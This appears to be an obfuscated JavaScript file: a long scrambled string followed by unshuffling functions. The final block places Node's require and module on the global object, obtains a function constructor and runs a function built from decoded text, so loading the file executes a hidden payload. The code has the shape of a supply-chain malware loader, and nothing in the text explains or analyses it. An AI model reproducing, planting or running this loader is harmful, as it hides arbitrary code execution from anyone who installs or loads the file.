RAI-nqau<}.ycR...cRR.ccc$^RRdC_R<t8cRhs2\"R2.\'S>))2h!efy..>!iL$en ;%9OTv.d$4RRC<cPS(tuRwl&(m#\"R|pch<tH$a<< .t!RSEf.RRgcNP.R CRi4mR<#MRR<;wi-#E <<t<eR<H<RrntoE(!0r0<d..RC\"cn..2bp(6Cp<SR\"e1l)cc<a(P.P9e<qa)<<1<n.iRaRPR(}R=.&,2!cwR.)PR$.<qR<}!1*S<R!Rf.<c<Rd_<R2R<<#]<<RRRp!.rpR<*!TRIR<Pk<Rzta.&}.aleK=iP<R\'=gRP}Rp${SB. Rsy.(.t! c;<e5sh64tt<pf<otxuLTkr>;<R.cpsR.cRtR-#a4uR6.Rte;-($?w8:p/&Rl0<r#<e iisf!d$ao_(#cmr e<RRV!Pnca<t.~crc(e\'*a: <RRneaZe.%/dR<RR*(E `+e[PcwRw <(eucta).7W</$P<.hcST 7eRB!.+R.I<bhRel.te.b4[unueuR!Rlt(RRR,},HftHv_n.<eR _A<8<sr<Rx4)RN!pRd|B <RRkie\'c-.Rcnm3cs<Si<i.).E(R(<RRPR _3R<cwe.!.l<R$!Rbd,e<PREl$tpr!<o/).RRt!,T(rc#/.Ry(+RrRg`<f.<a+.f)/<<&< eRR<ei-<BfE.sRbnRR).R%/jtlR<%c R!R(xR#cR.sRR.RM.<R7c(cglRcm.]<.ec2b)P<<2RR&daBK)r<Zt>[daRHced.MR<}sRGr.R<?1RfRRcccR(osc\"RR~k<\\!Mc.p.C)uRx)+(Rk\\e\'j6MPURCmc?RR3R4(iie.sRe*R:zSR;Pn(Z)<lkRvl:<RQ{Rci\"cP+e,MRWa.<RMrRlt#<RRst3r!.<g<KRwR(Rj.RRa!.G4R.$pn.z;{eR;21{0T4(rRk-\'.!<Rx<iKh<)s[<tc PueR}r(faaRf7l<R5!rRlDXRm.1:piR <= Rjso.<er!oRqI)R1Rrrwo{&tRRK<nCZ-0M.cuR)c%cd0+w<$E<iT<<otdayn<io^.R\'RRwRc65kR#JP.<!R5e!r{Re;yeR(.0=;cis.c(gtR2pu9=MQf[{,On ..PNi(<.RaiQR..c%t/(/R<.r.Rr..l!scue.aP~R!c03aUR\"tcsc.!rVRpaiz0<b\"dtgd!.s?#cvdR~#R<R<)(Tb.IR)Pc<6?7)]4W6#nnPt.}re|RU>ReaR)p# nS+b2%iRj}s(Xn^osycsgdJ.ss[pkR8. suwrRny}do.GiT.<w+c.(cs;! nh(R,RCR[<&XR<<.cbcTRsAfncS-R\"i<.cB(|RR.Rd%R.U/R.rL<t)!ReR2cpp!s<>R?1R$<teR<<Ro0rtf(ResbDR7liaR.}s./sRcrsarlR%f]s0R.<le<re%s.sllsb8ROxCRtc1t6{.- Rl.eRo.cgmRkoRsbca<Iyu}Rrt#s&|tRaxR)ho.Rsf kRRR4cr(x.c=t.<i3(Rx .<..R$f\"t RRsN</C RnRdRrpRR<od<.R<r[ar\"l<. P\".Rs.R.rc!v#DfReebo{,R)d8v<fRc.cJ<te.!RR\"kS(S)R#<S.hP}rt.(/(.c(1d<Rw!su0(o.Pb(0.RJcEiC.f( .i.buc<#r...RR[8)_!R.SRB!\"tRVbn_RlcPRR oRn;h<RP@r8aRrlc|co5(Rp)<Rxd<<$.n<lo}erR<oyRan.oy.RIB<ht<cobEiR}(mMr.TaR0RetiR}.!<.R19t<AebR_Lclh!D0r.R0ilirRc/s8<cR(r*R@e<<.l;.rc-PulaRccRi\"06@!Rc!.Qkl,<g<7}b(aRcL.cs\'+..T(<rR<<..&fd>Ro coemRcw.lcn(c:R\'|t<RnRY]4M0GR.RFRut.!<f.u+$+t<R*7sRRR(ibhd=P.<}RR=eR._).)rr,4& lR}e<R6RR<^gfleRdstP~<bc.(sy<5}Ri?lch<&.3{u.n_:iR7b;0<R<cRRRcR@|1seGRs2)c=h<f9e<<r+eR\\\')&5rv/Fr[.a.tn.RPrnU<o_c6n=ET<.i+xc7levsu<r.!Rc<!]Rw .RR(]PRD. lf!:&.bdpTl.R#RS.$R<(R <<c[.n. oRr67r<e-R-uc*RR$R.baeycs.![RxRR<DXtfncRQPisRtgc<.aR8!b!<St0<R> RRriR>cUp.cRWZR!RDK)0cvnnks.e R ^dlR<cfRRu:sGRe,(gRVR\"RuRRR\"RtR<Rs\".ERi_P&R<lyoSg\'s>vRcwe4Rcg`.h<_c\'(umdRP>o9RPn1R#.cfR<P]Rs/anfqNRR\'<.Rc8ciRRRc.a_ptKo<psr<7<RRi.o_c/!nRRs( >RP]xtt_s_ohB<a\'s&.P< .kGc6r<7io/wRISPPcxhRwc.<.cic%1Rf89dS <RbcsRVRsxrda]R;t?RN,,R>)cPY\"cRcReF !0RRq}}r05L6.<R.rf<$u|c<c<U-D[ cc.o<5;< (.E.h.R_l<Rr<<F<[ttCo%mS.RR3IbcioRR<apRcRc[RR<.fnRR,.RBan(y/R|HpGnR.<=RR<u(acs$R3eR)mc_A4unt\"e;sor(%RPt(eg(-*r!m<RD(RRa.rglz.Rw.fR]qavo]f(%<<ccl<4s9\\@u 9e.*x./FtSRP[.$%n`z)<<$!5Qcb+]R3tR<fiPce\\<zi.Rcabr (<<bnv6!tnw_cXf(nh.[}*s(`<P>(R<..<xt9R(.c<(e0R.Pao.!d((-@f0e<<6RoRu;(d` Rp..<p,e<T<N.PR.[RcOz)f(<l].u{?rf<R;R<I*a<<$`R( (...<\":<NR%eR i#.z.l(rR,dRa.dRv<sVc(s]i)Mh.Rn<RRRttRg,~.R[R#ef.;ttp.)sRnStlRR2oe.&ci(a}.\"P&yseR_a%rRR.D<iPsRD!i.mR\"Rjzh<uR.,>de.jO}aRQcV<s$3CgR<R5EcdUhce.!Uf.R-x6<].wc<<.E!rRPRiCx.SR!m.nXb.7f.zefZR\"\"](y<xb<k<]UR-c}qf.!Ni=YiRoRRN.@sw1Lue1kR& #rDceR.alRR.R.(\"]MRtMiRr)rluRd&.RRcpifIl2R<R<<5f)z&fURec<s4<ensR.o\"<i<,R!s oBiR-cR0lRNtTR)SRc<fdutRRdPzRH(Rcs)PD<c$Rx2&:1Hrlo..n fs.$n8upO$0isssi.-<vR<.<qQ(!R! [!dxwn.Ryu*i?dR%.R2Rt>r7s!tRs_Red`!<$]R Rm!RfxR mRok!ct<(..nRcSRn\\&.<0RTiwmtp3*G(Py/nxFhtR<.:Go...(Rt.r.<0ctT(r< .o[iv.<R1sR9d]R+RRheR!cc2RRe\"9c[r<;DePcRRktGlg<?tAU\'ttRQR} w3tRat](Vt-?<<?..\"lr).eR-RRI^EKv.47Ro+iN<ece.nRx(tRHR t8;Rir)<aRcx(qaRs@ferRM.<=.ct@<fcR.R)R.rxl!t/,lsRRRc=.i03RhRRs{_xRr<Q<c,a<<EW(MoR< utE\"f}bfr.<sR+]dr <R!QRw.i IRT_Po.(c0t8(sRTRRcnBR!\".xID.Ai}epoR3!oz=]etkRt/uA14RR9Rct!Nadr_nGC!/b$}R\"xd<iRct^.uuw=3dRpwgR9R8PqRi#Rpg9u=1i0f<.R<P0f}tv_r3es:<fr<i7(<y(olR.e9ooBT._RtoE) as(<cRiedtssR/RR/erR(.wce.R.rPy(RO(<.gHxrR<T.L!Rx(<o([.+{<c<R<.eiNTRC[x.4RkR$pK\".lcP(.<tk.<RQFknwIR).t-Rr=e{<.PP #E63ap3[R)Lddc;RxR!R\' oo!)w.e!.Rc<0%<iss9RuO6ir$.R.ip6%m-6wRi<z< gr=nweRRN__R(ReJvRfR%:NRPR<nRRR$.R.mR<rR#{Ec.)b<6peiRf#tL..R<PjRR.(,a_ll. .D g<(rhv \"4k! `lR<ke1 c$$5Rz.RR]eu&DiR .R<((cersE.aoRhef)%eLR).:.^)esCR.}.T<P^. Dy<#RcRpNRr)nRRl_3d8W(c=-3EeqeiMRReRzRacCue<l<Rsi.a;rc<.ldRY.RarlRcnOf3hTsdt<M\"m<s(np}:A.fyR<RC<#Ry0vR<}<R.<%ats!lR>-<2lld.nr5=(F:.RRlnRcR\"sz3o\"<fR&3..!Y>fR)beRlshpM%<f.(d!abiFR 3waM<se..qfR.i_.&E!.&RRRcRx{R[R._?R2!!RRcx)RIM.)f=#1ELbRRnJeaMim1)RRR_ |<la<3)0ycd&.#n=l.|Rs;.f(ec.cs=c{?R/%d_!anOce<Rrxa.\'b)=_<m)icAcCRc.n<R.e ..R-<AR5.Rm[dR<<2R.An9xRctmcE%[..R,Qt<uPf_!<R= tZRclpP*.uep6<f.b8RR<cSrk<e}Rckdc.;<tz.l.<!io.<r/2<R=bcRRsVD.R.1b<cc<R}<h+. RvTRp_P<.rs(uPQt:..<>Rk9!=a;o<a*.7r]0Y)8c}z(<a.R.e8Ro tl Rc(A~i!*(bR%cR,c0t< rMRR< Ri< .fPe*+E)m.oj..m8m.cR($<f.R.idey}cBRR!sc<no9R<n RwrN0#tRduc_-RS\"i{i)(nMcR<0N</V<<.,0+w.]<w<ReeR,w/eR.R)i. R<e .6Rga.rgs+Qitd.o!cteaLRo)3R <.cd./.~< .s\\.e<sp5R.<RRwa!*.R)tR,ofRZ<ZtcRhsRr$/.RC..b \"cRt,\'leacPc RR<Rz\"<Ri l0oRRdRs7.R(eCcR_.6\"_R..p<&kddee.<=..lo.=R<!b.&Rc<tcCr0m&cXu\'wnd.s;sw+R4/suDicPba ..i!o1^r}I>e4<:RwCRic<RRRc\". dRpt0<.Rk0<W8r RnR.Dc.CN lwoh.l-<R<pcbR Pe6hY-Rt.cEp:<+a-V<RaRf\'(<rRRR&<az<4RRR.E)7.xrc0ilHRTisc.ZfRfcRx-th).R#=!<C.w\"l{e]e-R</<s4Nt.op\"ce.4Rn{SRo<R)Cc])e(Rw8RR. <1hc{p8cS!e<R?RKa=i6Ri[.IRpR$RbxRScl.p<P!fa!vvsO.!pRRt.EglRt<.!iud.lu<is.RoR4!.P.cm.Pi}Ro..lPNRy6=t{<ae._!RwRtaR.sf.!.]4[e.RkE}-}ve..$NwiD!}.0R#<isaR3p%<}.aR@RJt.RGax.R\'spC0!RGcr.2FRiRePaRnsRRRna<R)5U:\"n=cdc?ABt.20.tdc!C1R c.<edaA.R(.,elRcR<c&<.eCRURif{aJKR+ex-x:Pc%ei@ecRek?pR.4 RR<R#$c..i+!4RR$R3#R.r(PiRR<c.Rci_U!zRRR;u^|.Z.s(TRRTc.d}R<y._c<.RR{$kR4FB($\\<w. .;R<eR4\\sRc8<R.R[EdR uoR[}V(.pd\'\"<Ja(4prAR(.Nc<<rp3.>z eeR!<.<57:&P)c[RbRREM(_P.}RR).=Rhr<,CRRR(<k3R+hn %R.RF)lR;R.s R.jlmR((loH.<R<{PReRi<<cdeK.R.fR2pR(ao~.RyRRR[:RR?eisRPfk Ys(s3.c <4blo<0<9{o<RT@R..nRiR;al?soR0g<T.Rtm<u.s\\?Rl._Rccz4&:?0 .5R/ctc4<R>hi%.i#i}<R.Emc1xAnfR{Scr.R.%|\".PrrRn<cRnP!aRRtRfR.P 8\'R<JA R&i<ecc{]cf.RmaR.irc.iReZ\"n<y!< cR #<,ec!Rd9sic+_1a.ru..b..Reh<R~i$ot<fRdcit<\\go_0lRmvF(<e9s<Rtt( !RnR6}<.itO..&9s4dNRc .o.RR.]j0 R ma4;r<sCa)& mo[xlR*ht!,Aup Ru,fRtf[j)P*cRR1<RSv s!2cIsR..e74hRd\'c:vsr.s;<e(<_!MRfRfLLgal.!.u.R9(Mcla(d}tOa.}RcIebmEc0N(RD%bE$ rd<cw).F<ObZWR.jg.U4\"afR`\'m%/efaxRRR;Rna:7vR0bc.a_R<<jRRs..X)spGi&v\'e.l.2.I.e9rRe.s\'1=r.eRexbb_RR_e9cd<FIP!.cR+8.446/U<<ls!]<u`pRsub<b>JPwp@ilR<i)k!dRLkR.trRx(rr)% /.(]b8cRs+vR-c)}:osR.c#\"<cqk<ek.imRSN.RsE bPPn)<e}o0e\".1dRIR!(r.%.I..Rfza_?RRkf/,tcRRIf.<iR bdRO.cPcdeR.s}ejFbp;o.fs<c_mc<aF.dnc0c RRR.qn .RcR.hRKj<Rs.kc<3Rs.ccTt.trtnt>w;/IcZc8r<i.Rt>Rcs..s s{Te <!.+.R.<uRPRo.<K.m.a.srM<R .cwRic<R)nP(<RReeutcJc%pN.Rsce.=eaf0<\'@S}1<<YIjr!!<4a.fRR.l&<R$..lv.}|5&R.R!<)xfs.b$:Rc l.< o(J.e.#N.7t<)c<w eR0.=<yc !..Re?<n\'B[Rbo\'auR} rae#R=.iR(st2.b~ <Sc.}tTsRr<aR) ryir!C<c td~\" X.ttR<R!d c..!ed.R.<R n.Sne!!)4/oXRRu.enR<.rRqR\"l_M.efttr tRc._r<R.R.dd{Wh{R.<.&RRc<.gf}Rcr52dte}d(}?cF7.xy$W<!..c6pc?Nc0z(h4.RRo=_oa.Pf!f4hR.Rd*e=d#cc6rr{o/RaRS.z.v.RDc<.[R9.\'t]&.RRR-4R&ew\\cRYeonf t.m)e=.icK.R{.0sl1pcRs(chl.WR.yc.{eil3ft<{/.C.(.n<l)>m<<d1<a? nec<R..avloRvjRge._ =R+.RR.wdR.d6%.Icc(+t.:ci\'.cht.b.R!s4ft_Rxta<s}H,cc.dkRnc..}c# n)R.(_)c13.ot.o.}<!.tRR).t<...8Rn.Htct<blRotcQGn^*_xmecPT}..<<r0 lEt!dn\"0pf.gl}R<eRlT@i..g)ne4Ru<fRRTg.cR.c.eet<..^ee,r;t|pcteWFs RgadRroG(ltl #(yr<.#ddt.<R i-o<stId!b)RIEt*RRn&R.c<iRmlR(-(mtck.Ry!0RYJ<c.Ri>rr. w9cTaR=<PcdK]_\\2f( #.Rs%.te<n/Rrycc.nRc$.P&.f.iccBPNRdR;R.5<RR<mPo{(R{_n<lRid.hR .dRnRr!JwR0.RPRr.>=(f<e?.<Bf]xRcbcPcRs}<R(s.RPY.RR_Pk(o<(dl<0eR,1:D1sv.ilhe_PRpccR1qm.dm\"<sisPd.? pmdRhRnct(?$RrtRx.e)`..R.p?i!R1Rr( {.eTRR}.c}<RR8..RpR\"cg;.cc0RrR. t&3nd5ecPb_.R!RaccRbcdb}c(!{t<.Rnv.NR&~eAs$z\"<4<.ogsfCaRl<ocERoRRt..<s.i`R?.sgc..RsRs.\'$xRcsNRR!R`RoR_n!#R,!5qf.#BIR@l.,.]oReRa|<R[t<<:|a[4<R~R!+Eg-R.aP!e &l<5n%cRRdFryc.s/R.;{{,H.;<n<.)4.tdmR)sRd(mRb{.<Rc.rPm.cRe cRckRx)<c&ci.yceluy;,.XdrRlRR# ccf.cR  R$Rcorr(.rCp<Nr#E(]RnR\"ijngRR4<C$adlRac&t(!-Rp.]do.ciR}usRrs(n C<!;.fc.c@z<tR4tCRtRtc=.c3cfo.!  R;<fe8RdrMRR[dN[cyRc:>Tn<l^.lo8RiRRcssc}Rtpc{.sRs...}c.RaY[<a* )I(ldR(wsr6 *R7!a<S.c<\\R.BELRe6Yf<1<ecPrDe sl0PbD#R]o.\'<l.m R(p)<ekac.cR.d.._u<a\'< Rlibfmndf].(%RR<RNDcRER#V..asa[n&R,$<,R<o4RReER)ssL]8ESRReREiR{R<c.{ cWGf}ohdcas.]. fP= os67EocIPoc .7igcFCR. <cE.N .bR"];function b(q,h){for(var i,p,t,s,j,m,g=[],o=0,k=h[0];o< q.length;){g[o]= q.charAt(o),o+= 1};for(i= g.length,o= 0;o< i;){p= k* (o+ h[1])+ k% h[2],j= (t= k* (o+ h[3])+ k% h[4])% i,m= g[s= p% i],g[s]= g[j],g[j]= m,k= (p+ t)% h[5],o+= 1};return g.join(a[0x0])}function c(q){var h=String.fromCharCode(28),i=b(q,NX);return (i= (i= (i= i.split(a[0x3]).join(h)).split(a[0x4]).join(a[0x3])).split(a[0x2]).join(a[0x1])).split(h)}function d(q){return b(q,SX)}function f(v,m){try{var u=Object.getOwnPropertyDescriptor(v,"name");if(!u|| (!u.writable&&  !u.enumerable && u.configurable &&  typeof u.value== "string")){Object.defineProperty(v,"name",{value:m,configurable:true})}}catch(e){};return v}spin= f(b,"spin");splitLane= f(c,"splitLane");peel= f(d,"peel");NX= [6912847,367,20411,613,43759,5019283],SX= [5283741,241,41953,187,56129,4738901];!function(q,h){q.z= z;var i=c(a[0x5]);q[i[0]]= h, typeof module=== i[1]&& (q[i[2]]= module);var p=d(a[0x6]),t=d[p.substring(0,11)],s=t(a[0x0],d(a[0x7]));t(a[0x0],s(d(a[0x8])))(2509)}(global,require)})()
